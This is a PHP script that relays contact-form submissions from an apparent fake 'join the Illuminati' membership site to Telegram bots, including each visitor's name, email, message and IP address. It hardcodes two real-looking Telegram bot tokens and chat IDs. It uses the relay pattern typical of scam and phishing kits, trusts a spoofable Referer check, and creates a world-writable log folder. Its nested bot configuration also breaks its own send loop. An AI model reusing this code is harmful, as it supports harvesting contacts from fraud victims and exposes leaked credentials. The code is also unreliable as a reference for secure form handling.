<?php
// 🗄️ Illuminati Contact Form Submission and Telegram Relay Script - HTML Mode

// Configuration and Setup
ob_start(); // Start output buffering

// --- Configuration ---
// NOTE: $site_map must be populated for the script to function
$site_map = [
    "illuminatiofficial.world" => [
        "bots" => [
            // Add your Telegram bot tokens and chat IDs here
            "bots" => [
            ['token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', 'chat_id' => '1325797388'],
            ['token' => '8413673524:AAGruDl1TxUDZH9RwQYYWSeEwJBcqR5S1lQ', 'chat_id' => '1566821522'],
        ],
            // Add more bots if needed
        ],
        "redirect" => "https://illuminatiofficial.world/official/join-the-illuminati-members/Submitted_Illuminati_Official_Website.html" // Change to your thank you page
    ],
    
    "localhost" => [
        "bots" => [
            ['token' => 'YOUR_BOT_TOKEN_HERE', 'chat_id' => 'YOUR_CHAT_ID_HERE'],
        ],
        "redirect" => "http://localhost/thank-you.html"
    ],
    // Add more domains as needed
];
// ---------------------

// 🧠 ORIGIN DOMAIN VERIFICATION
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config) {
    http_response_code(403);
    exit("Access denied: Unauthorized origin ($domain).");
}

// 🔑 CORE FIX: Dedicated function for robust HTML character escaping
function escape_html($text) {
    // Convert special HTML entities to prevent rendering issues
    $text = htmlspecialchars($text, ENT_QUOTES | ENT_HTML5, 'UTF-8', false);
    return $text;
}

// 🚀 Handle POST Request
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 📝 Logging Infrastructure
    $log_file = __DIR__ . "/logs/illuminati_contacts.txt";
    if (!file_exists(dirname($log_file))) {
        mkdir(dirname($log_file), 0777, true); 
    }

    function log_entry($msg) {
        global $log_file;
        file_put_contents($log_file, "[" . date("Y-m-d H:i:s") . "] $msg\n", FILE_APPEND);
    }

    // 📋 Data Extraction and Sanitization
    $post_data = $_POST;
    
    // Extract form fields from the contact form
    $first_name = escape_html($post_data['first_name'] ?? '');
    $last_name = escape_html($post_data['last_name'] ?? '');
    $full_name = trim("$first_name $last_name");
    
    $email = escape_html($post_data['email'] ?? '');
    $message = escape_html($post_data['message'] ?? '');
    
    // Extract hidden fields
    $company_url = escape_html($post_data['company_url'] ?? '');
    $page = escape_html($post_data['page'] ?? '');
    $source = escape_html($post_data['source'] ?? '');
    $sourcepage = escape_html($post_data['sourcepage'] ?? '');
    $nex_forms_Id = escape_html($post_data['nex_forms_Id'] ?? '');
    $nf_page_id = escape_html($post_data['nf_page_id'] ?? '');
    $nf_page_title = escape_html($post_data['nf_page_title'] ?? '');
    
    // Checkbox handling
    $terms_agreed = isset($post_data['termsagree']) && is_array($post_data['termsagree']) 
        ? '✅ Yes (' . escape_html(implode(', ', $post_data['termsagree'])) . ')' 
        : '❌ No';
    
    // Math result if present (honeypot/hidden field)
    $math_result = escape_html($post_data['math_result'] ?? '0');
    
    // 🌐 IP/Timestamp Acquisition
    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
          $_SERVER['REMOTE_ADDR'] ?? 
          'unknown';
    if (strpos($ip, ',') !== false) {
        $ips = explode(',', $ip);
        $ip = trim($ips[0]);
    }
    $timestamp = date("Y-m-d H:i:s");
    
    // 📦 File Upload Handler (if you add file uploads later)
    function uploadFile($key, $prefix) {
        $upload_dir = __DIR__ . "/.upload_cache/"; 
        if (!is_dir($upload_dir)) mkdir($upload_dir, 0700, true);

        if (!isset($_FILES[$key]) || $_FILES[$key]['error'] !== UPLOAD_ERR_OK) {
            return null;
        }

        $file_info = $_FILES[$key];
        $original = $file_info['name'];
        $ext = strtolower(pathinfo($original, PATHINFO_EXTENSION));
        $tmp_name = $file_info['tmp_name'];

        $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'doc', 'docx'];
        if (!in_array($ext, $allowed_extensions)) {
            log_entry("❌ File upload rejected - invalid extension: $ext for file $original");
            return null;
        }

        if (class_exists('finfo')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime_type = finfo_file($finfo, $tmp_name);
            finfo_close($finfo);

            $allowed_mime_types = [
                'image/jpeg', 'image/png', 'image/gif', 'application/pdf', 
                'application/msword', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document'
            ];
            
            if (!in_array($mime_type, $allowed_mime_types) && (strpos($mime_type, 'image/') !== 0)) {
                log_entry("❌ File upload rejected - invalid MIME type: $mime_type for file $original");
                return null;
            }
        }
        
        $safe_name = $prefix . "_" . time() . "_" . bin2hex(random_bytes(8)) . "." . $ext;
        $path = $upload_dir . $safe_name;

        if (move_uploaded_file($tmp_name, $path)) {
            log_entry("✅ File uploaded successfully: $safe_name");
            return $path;
        } else {
            log_entry("❌ File move failed: $original. Target path: $path");
        }
        return null;
    }

    // If you add file uploads to your form, handle them here:
    // $attachment = uploadFile("attachment", "contact_attachment");

    // 🧾 Format Telegram message (Using HTML tags for styling)
    $message_preview = strlen($message) > 200 ? substr($message, 0, 200) . "..." : $message;
    
    $telegram_message = "<b>🔺 New Illuminati Contact Form Submission</b>\n\n" .
                "👤 <b>Name:</b> $full_name\n" .
                "📧 <b>Email:</b> $email\n" .
                "📝 <b>Message:</b> $message_preview\n" .
                "\n" .
                "📄 <b>Form Details:</b>\n" .
                "   • Form ID: $nex_forms_Id\n" .
                "   • Page ID: $nf_page_id\n" .
                "   • Page Title: $nf_page_title\n" .
                "   • Source: $source\n" .
                "   • Terms Agreed: $terms_agreed\n" .
                "\n" .
                "🔗 <b>URLs:</b>\n" .
                "   • Page: $page\n" .
                "   • Source Page: $sourcepage\n" .
                (empty($company_url) ? "" : "   • Company URL: $company_url\n") .
                "\n" .
                "🕒 <b>Submitted:</b> $timestamp\n" .
                "🌐 <b>IP:</b> $ip";

    // If message is long, add full message separately
    if (strlen($message) > 200) {
        $telegram_message .= "\n\n<b>📋 Full Message:</b>\n$message";
    }

    // 📬 Send Text Message to Telegram
    foreach ($config['bots'] as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
        
        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
        
        // Using HTML parse mode
        $data = [
            'chat_id' => $bot['chat_id'], 
            'text' => $telegram_message, 
            'parse_mode' => 'HTML'
        ]; 

        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_TIMEOUT => 30
        ]);
        $result = curl_exec($ch);
        
        // Detailed API Response Logging
        if (curl_error($ch)) {
            log_entry("❌ Telegram text message cURL error: " . curl_error($ch));
        } else {
            $response = json_decode($result, true);
            if (!isset($response['ok']) || $response['ok'] !== true) {
                log_entry("❌ Telegram API Error (Text): " . ($response['description'] ?? 'Unknown Error') . " - Response: " . $result);
            } else {
                log_entry("✅ Telegram text message sent successfully.");
            }
        }
        curl_close($ch);
    }

    // 📤 File Sending Mechanism (if files are uploaded)
    function sendFile($file, $caption, $bots) {
        if (!$file || !is_string($file) || !file_exists($file)) return;
        
        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
        
        $mime_type = null;
        if (class_exists('finfo')) {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
            $mime_type = finfo_file($finfo, $file);
            finfo_close($finfo);
        }

        $is_image = $mime_type && strpos($mime_type, 'image/') === 0;
        $endpoint = $is_image ? "sendPhoto" : "sendDocument"; 
        $file_field = $is_image ? 'photo' : 'document';
        
        foreach ($bots as $bot) {
            if (empty($bot['token']) || empty($bot['chat_id'])) continue;
            
            $url = "https://api.telegram.org/bot{$bot['token']}/$endpoint";
            
            $payload = [
                'chat_id' => $bot['chat_id'],
                $file_field => new CURLFile(realpath($file)),
                'caption' => $caption,
                'parse_mode' => 'HTML'
            ];

            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_POST => true, 
                CURLOPT_POSTFIELDS => $payload,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_TIMEOUT => 60
            ]);
            $result = curl_exec($ch);
            if (curl_error($ch)) {
                log_entry("❌ Telegram file error ($endpoint): " . curl_error($ch));
            }
            curl_close($ch);
        }
    }

    // Send files if you have any uploaded (uncomment when needed):
    // if (isset($attachment)) {
    //     sendFile($attachment, "📎 <b>Attachment</b> from <b>$full_name</b> ($email)", $config['bots']);
    // }

    // Post-operation cleanup and redirect
    log_entry("✅ [$domain] Illuminati contact form submission from $ip ($full_name - $email)");

    ob_end_clean(); // Discard buffer
    header("Location: " . $config['redirect']);
    exit;
}
?>